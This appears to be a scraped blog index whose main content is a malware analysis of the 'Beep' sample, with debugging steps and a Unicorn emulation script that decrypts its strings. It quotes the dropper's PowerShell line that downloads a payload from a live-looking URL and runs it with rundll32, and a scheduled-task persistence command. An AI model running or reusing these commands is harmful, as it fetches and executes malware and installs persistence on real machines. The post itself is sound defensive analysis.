id=\"intro\"\u003eIntro\u003c/h2\u003e\n\u003cp\u003eWhen I was learning about API Hashing, I had touched upon a topic named \u003cstrong\u003eDLL Unlinking\u003c/strong\u003e. This topic really excited me as it was a simple topic but yet it could go in length of how to detect it using VAD trees amongst other ways.\u003c/p\u003e","title":"An overview of DLL injection"},{"content":"Intro In continuation from my previous post, I will now be analyzing the dropped big.dll. For this purpose, I employed my friend and mentor r4sti to help me out in the analysis of this malicious dll.\nAnalyzing big.dll - Combining IDA and x32dbg Recall that in our previous post, when the dll was being dropped, a specific exported function was run:\n@echo off powershell Invoke-WebRequest -URI https://aradcapital.com/MpD8Yk/00.gif -OutFile C:\\programdata\\big.jpg call ru%1l32 C:\\programdata\\big.jpg,DllRegisterServer exit So, let\u0026rsquo;s open the dll in IDA and view the specific function:\nLet\u0026rsquo;s also open the dll in x32dbg and having it side by side with IDA. We can dynamically analyze a malware with x32dbg while also statically comparing it with IDA.\nThe thing is, if we try and run the dll in x32dbg, it will keep exiting due to many anti-debugging checks. We can skip all these and land to DllRegisterServer by just changing the EIP to that part of the code and continue execution from there. Do to so, we need to first find the DllRegisterServer function and then set the EIP there:\nHere we used CTRL+G to find the location of the function. After we have landed on the function, just right click\u0026ndash;\u0026gt;Set EIP Here:\nSince we are using both IDA and x32dbg, it would be a good thing to have the same addresses in both applications. To do so, I got the base address of the PE by going to x32dbg\u0026ndash;\u0026gt;Memory Map and copying the address where the .text section starts:\nThen, I just navigated to IDA\u0026ndash;\u0026gt;Edit\u0026ndash;\u0026gt;Segments\u0026ndash;\u0026gt;Rebase program\u0026hellip; and changed the base address to that of the x32dbg. Now we should have the same addresses and can start our analysis.\nAnalyzing big.dll - DllRegisterServer Viewing the code at first, I did not make a lot of sense as there as many functions that seem to be doing some math operations, possibly a runtime decryption\u0026hellip;?\nThe thing I knew about malware is that usually there will be a virtual allocation of memory in order for the malware to write and execute code at runtime. So I turned to the imported functions in IDA and found the references on the VirtualAlloc one. This led me to the following part of the code:\nWe see that a call to VirtualAlloc is happening and right after it a function is called - which is also doing some math operations in a loop. My assumption is that after the allocation of the memory is complete, something is going to be written there, so I got the address of the call to VirtualAlloc and turned back to x32dbg where I put a breakpoint at that part:\nOur goal is to get the address that VirtualAlloc will return. This is why at that address something will most likely be written. Something of highly interest!\nRunning the program, we hit F9 to get to that breakpoint and the execution stops at the call to VirtualAlloc. Then, we just hit F8 to move to the next operation (after the VirtualAlloc is complete) and see that a value is moved from eax to [edi+8C]. Taking a notice at the address stored at eax, we will get the address of the virtually allocated space previously allocated from VirtualAlloc:\nA good trick that r4sti taught me is to put a hardware write breakpoint at the first byte of the memory allocated space . This is done in order to stop execution at that part when something is written to it. So basically we found the memory allocated space and now we are going to find out what will be written to it:\nAfter our hardware write bp is set, let\u0026rsquo;s press F9 and see where the code execution went:\nWe see our first byte has been written - please ignore the difference address between the images. It\u0026rsquo;s cause of ASLR and the fact that I was reloading the sample while writting this post. Now, to get the fully written bytes, let\u0026rsquo;s remove the breakpoint and then place it again at the same position. This is because, when all bytes are written to the allocated space, most likely a call to that address will happen as it will contain some short of code:\nAfter the allocated space is fully written, we see the execution stopped at the function sub_70761000:\nHaving the fully written bytes, we cannot make anything of it. They seem encrypted.\nExploring the function that the execution stopped, we notice that there is code execution since a stdcall is taking place:\nSo since the execution stopped at that function based on the breakpoint set at the vallocated space, some use of these bytes is taking place. Let\u0026rsquo;s remove once again the breakpoint and replace it at the same byte and see what happens:\nThe code has stopped on the call eax were it will execute the bytes written in the allocated space. What we notice is that the bytes have now changed. We can also spot an executable written inside that memory allocated space:\nSince its a stdcall on bytes, its probably decrypted assembly code, so let\u0026rsquo;s proceed by dumping the memory to a file and analyzing it further. We will also separately get the PE file found inside the decrypted code.\nDumping the code - Decrypted assembly To dump the fully decrypted code, we must click on the first byte and follow it in the memory map:\nThen simply right click on the memory address and use \u0026ldquo;Dump Memory to File\u0026rdquo;.\nOpening the dumped file in IDA, we see the following code:\nYet another call to something is being made. If we load this in x32dbg and breakpoint at that address, we will see it executes the PE file previously found embedded in the decrypted assembly code. So for the sake of simplicity, let\u0026rsquo;s analyze it straight ahead (as we already saw how we would do that).\nDumping the code - PE file inside decrypted assembly The way I got the PE file was by using the pecheck.py tool by Steven Didier which basically identifies and extracts PE files embedded in other filetypes. The command I used is:\npython pecheck.py -l 1 -g s -D dumped_decrypted_assembly.bin \u0026gt; embedded_pe.dll We can get a general idea of this dll by loading it to VT which will notify us how malicious it is:\nIt\u0026rsquo;s time to start analyzing the decrypted dll now as this seems to be doing all the nasty work.\nAnalyzing the embedded_pe.dll Opening the .dll and viewing its EntryPoint function, we see a call to sub_708611C9, which by opening it, it\u0026rsquo;s clear there are many string decryptions going on but also many anti-debug checks:\nLet\u0026rsquo;s try decrypting one of the strings.\nOpening the file in x32dbg, we can rebase the program in IDA and set breakpoints on the addresses of interest. One bp will be in the starting address of the function sub_708611C9 and another one after a decryption loop its over. In this example, we will be viewing the decrypted string with offset 62E.\nPressing F9 on x32dbg, the program stops in the sub_708611C9. We hit again F9 to skip to the next bp which is right after the decryption loop. This means that if we follow in dump the memory address to which each decrypted byte was stored, we should see the fully decrypted string:\nschtasks.exe /Create /F /TN \u0026#34;%s\u0026#34; /TR \u0026#34; cmd /q /c start /min \\\u0026#34;\\\u0026#34; powershell \\\u0026#34;$%s = Get-ItemProperty -Path HKCU:\\Software\\%s; powershell -encodedcommand $%s.%s \\\u0026#34;\u0026#34; /SC MINUTE /MO %s We also see a hardcoded mutex and some other api functions:\nNow, if we wanted to decrypt all strings, we would certainly not do it manually as it would be very time consuming. The way to go here is to emulate the malware\u0026rsquo;s behavior and print the decrypted strings on the run. We can also patch addresses this way to avoid anti-debug checks and modify registers amongst other things. Special thanks again to my friend r4sti for familiarizing me with the unicorn engine, an engine that is used for this very purpose.\nBelow I will show and breakdown the script r4sti made using unicorn to decrypt all strings of the embedded_pe.dll.\nEmulation of the sample using unicorn The full script that I will be breaking down and explaining each part is the following:\nfrom unicorn import * from unicorn.x86_const import * from capstone import * import pefile from base64 import b64decode curr_offset = 0 def hook_code(uc, address, size, user_data): global curr_offset if address == memory_base + 0x9f8: uc.reg_write(UC_X86_REG_EIP, uc.reg_read(UC_X86_REG_EIP)+5) if address in PATCH_ADDRESSES: uc.reg_write(UC_X86_REG_EAX, 0) if address in [0x10001b84, 0x10001bcc]: off = 0x420c if address == 0x10001b84 else 0x3298 dec = uc.mem_read(uc.reg_read(UC_X86_REG_EBP)-off, 0x7b8*2) print(f\u0026#39;{hex(address)} :: {b64decode(dec).decode(\u0026#34;utf-16\u0026#34;)}\u0026#39;) for i in md.disasm(uc.mem_read(address, size), address): if i.mnemonic == \u0026#39;cmp\u0026#39;: ops = i.op_str.split(\u0026#39;, \u0026#39;) if ops[0] == \u0026#39;ecx\u0026#39;: ecx = uc.reg_read(UC_X86_REG_ECX) val = ops[1] if val == \u0026#39;edi\u0026#39;: val = uc.reg_read(UC_X86_REG_EDI) else: val = eval(val) if ecx == val: dec = uc.mem_read(uc.reg_read(UC_X86_REG_EBP)-curr_offset, val) if b\u0026#39;\\x00\u0026#39; in dec: print(f\u0026#39;{hex(address)} :: {uc.mem_read(uc.reg_read(UC_X86_REG_EBP)-curr_offset, val*2).decode(\u0026#34;utf-16\u0026#34;)}\u0026#39;) else: print(f\u0026#39;{hex(address)} :: {dec.decode()}\u0026#39;) if i.mnemonic == \u0026#39;mov\u0026#39;: ops = i.op_str.split(\u0026#39;, \u0026#39;) if \u0026#39;ptr [ebp +\u0026#39; in ops[0]: curr_offset = eval(i.op_str.split(\u0026#39; - \u0026#39;)[1].split(\u0026#39;], \u0026#39;)[0]) if i.mnemonic == \u0026#39;call\u0026#39;: if i.op_str in [\u0026#39;eax\u0026#39;, \u0026#39;ebx\u0026#39;, \u0026#39;esi\u0026#39;]: uc.reg_write(UC_X86_REG_EIP, uc.reg_read(UC_X86_REG_EIP)+2) stack_base = 0x1000 stack_size = 0xf000 memory_base = 0x10001000 memory_size = 1 * 1024 * 1024 emu = Uc(UC_ARCH_X86, UC_MODE_32) md = Cs(CS_ARCH_X86, CS_MODE_32) emu.mem_map(stack_base, stack_size) emu.mem_map(memory_base, memory_size, UC_PROT_ALL) emu.hook_add(UC_HOOK_CODE, hook_code) PATCH_ADDRESSES = [ memory_base + 0x9f0, memory_base + 0xa3e, memory_base + 0xaa4 ] start_address = 0x1c9 end_address = 0xd92 pe_handle = pefile.PE(\u0026#39;embedded_pe.dll\u0026#39;) _text_section = pe_handle.sections[0].get_data() _rdata_section = pe_handle.sections[1].get_data() emu.mem_write(memory_base, _text_section) emu.mem_write(memory_base+0x2000, _rdata_section) emu.reg_write(UC_X86_REG_ESP, stack_base+stack_size//2) emu.mem_write(0x10005000, b\u0026#39;X\u0026#39;*12) emu.emu_start(memory_base+start_address, memory_base+end_address) Stack, Memory, Architecture, permissions We start off by specifying:\nstack base and stack size: the space where calculations of the emulation will be happening\u0026hellip;like a usual stack. memory base and memory size: the memory space to which the code will be stored. For the stack base it does not really matter what we give it as a value as long as its a multiple of 5.\nFor the memory base, we are giving as base the same base that IDA uses (0x10001000) in order to better debug any issues along the way. We also give enough space (1MB) for the code to be stored. The relevant lines for these are:\nstack_base = 0x1000 stack_size = 0xf000 memory_base = 0x10001000 memory_size = 1 * 1024 * 1024 Next up, we specify the architecture that the code belongs which is 32 bit architecture. The relevant code is:\nemu = Uc(UC_ARCH_X86, UC_MODE_32) md = Cs(CS_ARCH_X86, CS_MODE_32) We create two instances since the first one (emu) is for the Unicorn emulation and the second one (md) is for Capstone. Further more:\nUnicorn: Emulates the program (runs it). Capstone: Gives access to the assembly such as mnemonics, opcodes etc. Lastly, we map into the allocated memory the address space for the stack and the address space for the memory:\nemu.mem_map(stack_base, stack_size) emu.mem_map(memory_base, memory_size, UC_PROT_ALL) By using UC_PROT_ALL we basically give all permissions to the space related to the program (it can read, write and execute).\nHooking the code The next line is responsible for hooking the code as it runs:\nemu.hook_add(UC_HOOK_CODE, hook_code) What this basically means is that for each assembly line, the program will stop (like a breakpoint) and call the function we give as parameter (the hook_code one). This function is where we will write the code to access the actual assembly instructions, view register values etc.\nSo we just emulate the program line by line, stopping at each one and inspecting the state of the program.\nWe will be breaking down the hook_code function shortly.\nPatch addresses We continue on by specifying a list of addresses that are going to be patched:\n\u0026#39;\u0026#39;\u0026#39; Since we will patch the program to skip calls to registers (call eax for example), we need to manually set the returned value from these calls. Basically, when call eax is happening, some indirect call to some code is going to be executed, which will return a value (for example 0 if everything went smoothly). But since we are avoiding these calls (since they lead to errors), we will be skipping these calls and also manually setting the return value of eax (since the return value is stored on eax). So by doing this, we pretend as if the code was executed successfully! \u0026#39;\u0026#39;\u0026#39; PATCH_ADDRESSES = [ memory_base + 0x9f0, memory_base + 0xa3e, memory_base + 0xaa4 ] These addresses are not random. These addresses use the value in eax register to decide whether execution must continue or stop. Since we will be avoiding anti-debug checks, we will manually set eax to 0 in order to continue the execution.\nSo these addresses represent the state of the program right before the checks, determining whether the code should continue or exit. Since these checks utilize the value of eax, we manually found these and stored them in the list in order to change the eax value at that location in memory.\nReading the dll and allocating .text, .rdata sections Next step is to read the actual dll and some of its sections. Specifically, we want to read and allocate the .text section as it contains some base64 encrypted values besides the executable code, but also the .rdata section as this as well contains base64 encrypted values:\npe_handle = pefile.PE(\u0026#39;embedded_pe.dll\u0026#39;) _text_section = pe_handle.sections[0].get_data() _rdata_section = pe_handle.sections[1].get_data() \u0026#39;\u0026#39;\u0026#39; Here we write the text section in the memory base which is at offset 0x1000 ad the rdata section at offset 0x3000 (3000 since the memory_base is 10001000 so if we add 2000 we end up in 10003000). We decide this via the help of PeBear. PeBear shows the offsets and addresses of the txt section (which contains the code to be run amongst other things) and the rdata section at these offsets, so we write the data on the same addresses. \u0026#39;\u0026#39;\u0026#39; emu.mem_write(memory_base, _text_section) emu.mem_write(memory_base + 0x2000, _rdata_section) We can see via PE-Bear (as the python comment states) the actual offsets of where the .text and .rdata sections start. For the .text section:\nAnd for the .rdata section:\nSo this is why we used these offsets in our code. Everything must match up!\nSetting the stack pointer in the middle We set the stack pointer on the middle of the stack:\nemu.reg_write(UC_X86_REG_ESP, stack_base+stack_size//2) This is because programs many times modify the location of the stack via subtraction or addition and we ideally dont want to point somewhere outside of the stack. That\u0026rsquo;s why we set the ESP in the middle to avoid such issues (at least its a good practise - thanks OALABS).\nPatching dwords There are some dwords that are used for some checks and based on whether they are set to a value or not, it calls some dlls.\nThese calls are to Windows API functions which unicorn cannot handle and will lead to errors. So we will be skipping these addresses by setting the dwords to some rogue bytes:\nemu.mem_write(0x10005000, b\u0026#39;X\u0026#39;*12) We can see the relevant code here:\nIf we click on one of these dwords, we will end up here:\nSo since there are 3 dwords we would like to modify all three of them in order to skip the if statements, we write 12 bytes of a random byte \u0026lsquo;X\u0026rsquo; (12 / 3 = 4 byte each, as this is their size).\nEmulating the code Finally, we will emulate the code by stating the starting and ending address of the function we are interested in:\n# Find the addresses of which you want to execute code. By opening ida, the function of interest starts at 1c9 offset and ends at 9f8 offset. start_address = 0x1c9 # entry point end_address = 0xd92 # Start the emulation emu.emu_start(memory_base+start_address, memory_base+end_address) We can see the relevant function and its entry point here:\nSo even if we have written the whole executable (.text section) in the memory space we defined earlier, we only need to run the code contained in this function. That\u0026rsquo;s why in the emu_start we define the start and end addresses.\nViewing the hook_code function Now that we have cleared some of the usage of the lines in the code, let\u0026rsquo;s start analyzing the actual code that does all the emulation of the decryption of strings:\ndef hook_code(uc, address, size, user_data): global curr_offset if address == memory_base + 0x9f8: # patch anti-debug calls uc.reg_write(UC_X86_REG_EIP, uc.reg_read(UC_X86_REG_EIP)+5) if address in PATCH_ADDRESSES: # patch return values uc.reg_write(UC_X86_REG_EAX, 0) if address in [0x10001b84, 0x10001bcc]: \u0026#39;\u0026#39;\u0026#39; Based on the address, get the correct offset (from the assembly) in order to read the decrypted string properly from the start of the location it is saved. Since it\u0026#39;s utf-16, decode correspondingly (size is for both enc strings 0x7b8). \u0026#39;\u0026#39;\u0026#39; off = 0x420c if address == 0x10001b84 else 0x3298 dec = uc.mem_read(uc.reg_read(UC_X86_REG_EBP)-off, 0x7b8*2) print(f\u0026#39;{hex(address)} :: {b64decode(dec).decode(\u0026#34;utf-16\u0026#34;)}\u0026#39;) for i in md.disasm(uc.mem_read(address, size), address): if i.mnemonic == \u0026#39;cmp\u0026#39;: ops = i.op_str.split(\u0026#39;, \u0026#39;) if ops[0] == \u0026#39;ecx\u0026#39;: \u0026#39;\u0026#39;\u0026#39; Usually in the decryption, there is a loop and we need to check whether the cmp in the loop is with a hardcoded value or with a register. Based on static analysis, there was either a check with a numeric value or with edi register. That is why we check for edi or else we eval() the number from str type to int. Also, in ecx there was the counter of the loop stored. That\u0026#39;s why we read it. We could also just keep a counter here. \u0026#39;\u0026#39;\u0026#39; ecx = uc.reg_read(UC_X86_REG_ECX) val = ops[1] if val == \u0026#39;edi\u0026#39;: val = uc.reg_read(UC_X86_REG_EDI) else: val = eval(val) if ecx == val: # If the loop is complete, proceed to read the decrypted value. dec = uc.mem_read(uc.reg_read(UC_X86_REG_EBP)-curr_offset, val) if b\u0026#39;\\x00\u0026#39; in dec: # If it has null bytes inside, its utf-16 so we need to read double the size before decoding from utf-16 print(f\u0026#39;{hex(address)} :: {uc.mem_read(uc.reg_read(UC_X86_REG_EBP)-curr_offset, val*2).decode(\u0026#34;utf-16\u0026#34;)}\u0026#39;) else: print(f\u0026#39;{hex(address)} :: {dec.decode()}\u0026#39;) if i.mnemonic == \u0026#39;mov\u0026#39;: ops = i.op_str.split(\u0026#39;, \u0026#39;) # get source and destination operands if \u0026#39;ptr [ebp +\u0026#39; in ops[0]: # i want ebp+ecx to be the destination operand # from commands like byte ptr [ebp + ecx - 0x1f0], al get only the 0x1f0 part # We need the offset to later find the address of where the decrypted string is stored curr_offset = eval(i.op_str.split(\u0026#39; - \u0026#39;)[1].split(\u0026#39;], \u0026#39;)[0]) if i.mnemonic == \u0026#39;call\u0026#39;: # skip indirect calls # for example call eax would make an indirect call to a function or some dll. We want to avoid that as it leads to errors if i.op_str in [\u0026#39;eax\u0026#39;, \u0026#39;ebx\u0026#39;, \u0026#39;esi\u0026#39;]: # move eip by 2 bytes # call [register] is 2 bytes in total so thats why we modify EIP by 2 uc.reg_write(UC_X86_REG_EIP, uc.reg_read(UC_X86_REG_EIP)+2) Let\u0026rsquo;s further break down this code comparing it with IDA to get the full logic behind it. The general structure is:\nAnti-debug checks: The code avoids specific addresses that contain anti-debug checks. Patching eax: The code changes the value of eax to continue the execution of the program as normal. Decrypting b64 encrypted data: The code gets the b64 encrypted data right after they have been decrypted. Main loop: The code contains a main loop responsible for checking the current instruction and based on the mnemonic do further actions (decryption, patching etc). Anti-debug checks Taking a look at IDA, we see a call at a function sub_100021DD:\nBy opening this function, we see calls to 4 more functions:\nBOOL sub_100021DD() { return sub_10002103() || sub_10002128() || sub_1000214B() || sub_100021B7() != 0; } These either use PEB or other structures and elements that lead to our emulation crashing. For this reason we decided it would be better to avoid the call to that function in order to keep the emulation going. After all, we only want to get the decrypted strings, not actually run the malware.\nThe relevant part that skips the call to this function is the following:\nif address == memory_base + 0x9f8: # patch anti-debug calls uc.reg_write(UC_X86_REG_EIP, uc.reg_read(UC_X86_REG_EIP)+5) What we do here is check if the current address (Remember that the hook_code function is being called at each instruction) is the one making the call to sub_100021DD. Basically, memory_base + offset gives us the virtual address of the call (base+rva=va).\nThen, if this is the case and we have stopped at that call, we change EIP to point to 5 bytes forward.\nWhy? Well, first off, EIP is the Instruction Pointer and shows what is going to be executed. So since we want to skip this call, we point to the next instruction which exists in an address increased by 5 bytes:\nThis is the reason of why we skip 5 bytes forward.\nPatching eax Next up, we are patching the eax value in some specific addresses. The addresses are:\nPATCH_ADDRESSES = [ memory_base + 0x9f0, memory_base + 0xa3e, memory_base + 0xaa4 ] And the relevant code that checks if we stopped in one of these functions is:\nif address in PATCH_ADDRESSES: # patch return values uc.reg_write(UC_X86_REG_EAX, 0) So whenever the address is one of these, we change the eax value to 0.\nBut why? Let\u0026rsquo;s view the relevant addresses.\nOffset 0x9f0 Hitting G in IDA and typing the base address + the offset (0x10019f0), we end up here:\nAfter the call to a function is complete, eax is being checked in an if statement. Usually, functions save the return value to eax. Here, the sub_1000113B was called. It does not matter what this function does. All we care about is continuing emulation, so we patch eax to be 0 in order to bypass the if statement and continue forward.\nOffset 0xa3e Next offset is 0xa3e, and here eax is being compared to the number 183 after a call to eax has been made:\nwe again modify it to 0 in order to continue emulation. As we will see later, we will also avoid calls to eax as this was leading to errors.\nOffset 0xaa4 Once again, a call to eax is being made and then eax is being checked:\nby patching eax to 0, code continues normally.\nDecrypting b64 encrypted data The next part of our code is responsible for locating and decrypting some base64 encrypted data found through either IDA or PE-Bear:\nif address in [0x10001b84, 0x10001bcc]: \u0026#39;\u0026#39;\u0026#39; Based on the address, get the correct offset (from the assembly) in order to read the decrypted string properly from the start of the location it is saved. Since it\u0026#39;s utf-16, decode correspondingly (size is for both enc strings 0x7b8). \u0026#39;\u0026#39;\u0026#39; off = 0x420c if address == 0x10001b84 else 0x3298 dec = uc.mem_read(uc.reg_read(UC_X86_REG_EBP)-off, 0x7b8*2) print(f\u0026#39;{hex(address)} :: {b64decode(dec).decode(\u0026#34;utf-16\u0026#34;)}\u0026#39;) The addresses correspond to the following code in IDA:\nWe found which offset to the stack corresponds to each encrypted b64 string (as shown in the movups instruction in IDA) based on the current address.\nThen, we proceeded to read the whole decrypted string by subtracting the offset previously found (to go back to the start of the point in stack the program started writing down the decrypted values byte by byte) and multiplying its size (0x7b8) by 2 since its a utf-16 encoded string (found out through debugging).\nYou might also be wondering why do we check the address with offset 0xbcc since it corresponds to a completely other string? This is simply done for our emulator to know that it completed the last decryption loop shown in the picture.\nMain loop And here comes the main loop of our hook_code function. In this loop we check what instruction is the current one, what is the mnemonic and address but also patch some register calls:\nfor i in md.disasm(uc.mem_read(address, size), address): if i.mnemonic == \u0026#39;cmp\u0026#39;: ops = i.op_str.split(\u0026#39;, \u0026#39;) if ops[0] == \u0026#39;ecx\u0026#39;: \u0026#39;\u0026#39;\u0026#39; Usually in the decryption, there is a loop and we need to check whether the cmp in the loop is with a hardcoded value or with a register. Based on static analysis, there was either a check with a numeric value or with edi register. That is why we check for edi or else we eval() the number from str type to int. Also, in ecx there was the counter of the loop stored. That\u0026#39;s why we read it. We could also just keep a counter here. \u0026#39;\u0026#39;\u0026#39; ecx = uc.reg_read(UC_X86_REG_ECX) val = ops[1] if val == \u0026#39;edi\u0026#39;: val = uc.reg_read(UC_X86_REG_EDI) else: val = eval(val) if ecx == val: # If the loop is complete, proceed to read the decrypted value. dec = uc.mem_read(uc.reg_read(UC_X86_REG_EBP)-curr_offset, val) if b\u0026#39;\\x00\u0026#39; in dec: # If it has null bytes inside, its utf-16 so we need to read double the size before decoding from utf-16 print(f\u0026#39;{hex(address)} :: {uc.mem_read(uc.reg_read(UC_X86_REG_EBP)-curr_offset, val*2).decode(\u0026#34;utf-16\u0026#34;)}\u0026#39;) else: print(f\u0026#39;{hex(address)} :: {dec.decode()}\u0026#39;) if i.mnemonic == \u0026#39;mov\u0026#39;: ops = i.op_str.split(\u0026#39;, \u0026#39;) # get source and destination operands if \u0026#39;ptr [ebp +\u0026#39; in ops[0]: # i want ebp+ecx to be the destination operand # from commands like byte ptr [ebp + ecx - 0x1f0], al get only the 0x1f0 part # We need the offset to later find the address of where the decrypted string is stored curr_offset = eval(i.op_str.split(\u0026#39; - \u0026#39;)[1].split(\u0026#39;], \u0026#39;)[0]) if i.mnemonic == \u0026#39;call\u0026#39;: # skip indirect calls # for example call eax would make an indirect call to a function or some dll. We want to avoid that as it leads to errors if i.op_str in [\u0026#39;eax\u0026#39;, \u0026#39;ebx\u0026#39;, \u0026#39;esi\u0026#39;]: # move eip by 2 bytes # call [register] is 2 bytes in total so thats why we modify EIP by 2 uc.reg_write(UC_X86_REG_EIP, uc.reg_read(UC_X86_REG_EIP)+2) The way the loop is happening is kinda like a template: for i in md.disasm(uc.mem_read(address, size), address). Basically, with the use of unicorn (uc instance) we start to read a number of bytes (based on the size parameter) from the address passed to the mem_read. Then, with the use of capstone (md instance) we are able to parse out these bytes as assembly instructions and seperate them further into mnemonic, opcode, address etc.\nWe can further break down the main loop into 3 subcategories:\ncmp instruction. mov instruction. call instruction. Main loop - cmp \u0026amp; mov instructions The cmp instruction check is the most important one as this is the one that is used for locating the decrypted strings. What we noticed through IDA\u0026rsquo;s pseudocode is the following pattern on decryption:\nSo the pattern for each loop is that it transfers each decrypted byte to the al register and uses the ecx register for pointing to the next location where the next decrypted byte will be stored. Let\u0026rsquo;s take the first 3 assembly lines:\n.text:100013C2 mov al, byte ptr [ebp+ecx+var_34]\r.text:100013C6 xor al, 0E8h\r.text:100013C8 mov [ebp+ecx+var_230], al The [ebp+ecx+var_34] contains the encrypted string array, while the [ebp+ecx+var_230] contains the decrypted values. You can easily tell by the fact that first we get a byte from [ebp+ecx+var_34], then xor it with a value and then store it to another array.\nThe relevant part for the string decryption is the following:\nif i.mnemonic == \u0026#39;cmp\u0026#39;: ops = i.op_str.split(\u0026#39;, \u0026#39;) if ops[0] == \u0026#39;ecx\u0026#39;: ecx = uc.reg_read(UC_X86_REG_ECX) val = ops[1] if val == \u0026#39;edi\u0026#39;: val = uc.reg_read(UC_X86_REG_EDI) else: val = eval(val) if ecx == val: dec = uc.mem_read(uc.reg_read(UC_X86_REG_EBP)-curr_offset, val) if b\u0026#39;\\x00\u0026#39; in dec: print(f\u0026#39;{hex(address)} :: {uc.mem_read(uc.reg_read(UC_X86_REG_EBP)-curr_offset, val*2).decode(\u0026#34;utf-16\u0026#34;)}\u0026#39;) else: print(f\u0026#39;{hex(address)} :: {dec.decode()}\u0026#39;) So first, we check if the mnemonic is a cmp instruction (cmp ecx, 0Fh).\nIf so, we split the operation string ecx, 0Fh by the comma symbol and check if ecx is the first part. If this is true, this means we have stumbled upon a decryption loop as these were using ecx for the enc/dec arrays.\nThen, we read the ecx value - which is the program counter of the loop - and we also store the second part of the operation string (0x0F in our example) as this is the termination value for the loop. There were cases where the second part was not a hex value but rather it was reading a value from the edi register. If this is the case, we read the value from edi register, else we get the hex value.\nThen we proceed to compare these two to check if the loop has been completed. If that\u0026rsquo;s the case, then we have a fully decrypted string and we proceed to read it. How we do that is by getting the current offset (curr_offset) and subtracting EBP with that. But what is the curr_offset and how do we calculate it?\nWell, the curr_offset is basically the var_230 from the previous example [ebp+ecx+var_230], al. It is the offset in memory to where the program starts storing the decrypted bytes, and with the help of ecx (which gets increased in each loop) we move to the next index of the array.\nSo to read the decrypted string from the start, we must subtract whatever value the var_230 has in order to go back to the start of the array.\nThe relevant code for calculating the curr_offset is the following:\nif i.mnemonic == \u0026#39;mov\u0026#39;: ops = i.op_str.split(\u0026#39;, \u0026#39;) if \u0026#39;ptr [ebp +\u0026#39; in ops[0]: curr_offset = eval(i.op_str.split(\u0026#39; - \u0026#39;)[1].split(\u0026#39;], \u0026#39;)[0]) So if the mnemonic is a mov, we split again by the comma symbol and check if the first part contains the string \u0026quot;ptr [ebp + \u0026quot;. Why? Recall to the previous example:\n.text:100013C2 mov al, byte ptr [ebp+ecx+var_34]\r.text:100013C6 xor al, 0E8h\r.text:100013C8 mov [ebp+ecx+var_230], al If we were to print each instruction, we would see that the mov [ebp+ecx+var_230], al was actually being emulated as mov byte ptr [ebp + ecx - some_offset], al. This is why we split by comma, check if this is the case, and then do further actions to get the curr_offset value in order to know where to read from in memory after the decryption.\nNow for the decryption part, if the decrypted string is utf-16 encoded, we need to read double the length of the string since the decrypted string contains null bytes between each decrypted byte (so double the length).\nMain loop - call instruction Recall previously that we said we want to skip indirect calls to registers such as eax for example. This is why calling a register might do a call to a loaded dll that unicorn cannot emulate, leading to errors. Since these calls are not useful to emulating the decryption of strings, we want to avoid them by patching EIP.\nThe relevant code is the following:\nif i.mnemonic == \u0026#39;call\u0026#39;: if i.op_str in [\u0026#39;eax\u0026#39;, \u0026#39;ebx\u0026#39;, \u0026#39;esi\u0026#39;]: uc.reg_write(UC_X86_REG_EIP, uc.reg_read(UC_X86_REG_EIP)+2) An example of why we skip 2 bytes can be given with the help of IDA:\nRunning our code After the breakdown of the code, I think we are now ready to run our emulation script and see what we get. The results are the following:\nThe mystery continues deeper, by downloading data and storing them in a dll named AphroniaHaimavati.dll. Based on an article analyzing it further, AphroniaHaimavati.dll contains data related to more anti-debug checks. This dll will not be analyzed as the goal of this post was to showcase how to emulate the decryption of strings in malware samples and hopefully learn a new skill like i did (thanks again r4sti!).\nThere are though articles discussing further the AphroniaHaimavati.dll that I will be leaving in the References part for anyone interested:)\nReferences\n[1] Bill Toulas: New stealthy 'Beep' malware focuses heavily on evading detection\r[2] swascan: Beep Malware: static and dynamic analysis\r[3] OALABS: PikaBot\r[4] Gridinsoft.blog: New stealthy “Beep” malware focuses heavily on evading detection\r[4] Unit42: Pythons and Unicorns and Hancitor…Oh My! Decoding Binaries Through Emulation\r","permalink":"http://localhost:1313/posts/beepmalware/","summary":"\u003ch2 id=\"intro\"\u003eIntro\u003c/h2\u003e\n\u003cp\u003eIn continuation from my previous \u003ca href=\"https://connar.github.io/posts/onenote/\"\u003epost\u003c/a\u003e, I will now be analyzing the dropped \u003ccode\u003ebig.dll\u003c/code\u003e. For this purpose, I employed my friend and mentor r4sti to help me out in the analysis of this malicious dll.\u003c/p\u003e\n\u003ch2 id=\"analyzing-bigdll---combining-ida-and-x32dbg\"\u003eAnalyzing big.dll - Combining IDA and x32dbg\u003c/h2\u003e\n\u003cp\u003eRecall that in our previous post, when the dll was being dropped, a specific exported function was run:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-cmd\" data-lang=\"cmd\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e@\u003cspan style=\"color:#66d9ef\"\u003eecho\u003c/span\u003e off\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003epowershell Invoke-WebRequest -URI https://aradcapital.com/MpD8Yk/00.gif -OutFile C:\\programdata\\big.jpg\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003ecall\u003c/span\u003e ru%1l32 C:\\programdata\\big.jpg,DllRegisterServer\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eexit\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eSo, let\u0026rsquo;s open the dll in IDA and view the specific function:\u003c/p\u003e","title":"Analyzing Beep Malware"},{"content":"This is a ‘secret password’ type of challenge, where we need to somehow reverse engineer the given executable and find the correct password:\nAfter the final wrong attempt, the executable closes:\nSo how can we find the correct password for the executable? Well, we first need to review its code. If you run the ‘file’ command on the given file, you will find out that this is a Mono/.Net assembly, and if you search up with how to decompile (reverse) these type of programs/applications, a tool named DnSpy will come up which is a tool used for exactly that – decompile/debug .net executables.\nHaving DnSpy installed in your system, simply drag and drop the .exe to it:\nNow, there are plenty of ways to go about solving this challenge. The easier way is to put a breakpoint at the line where 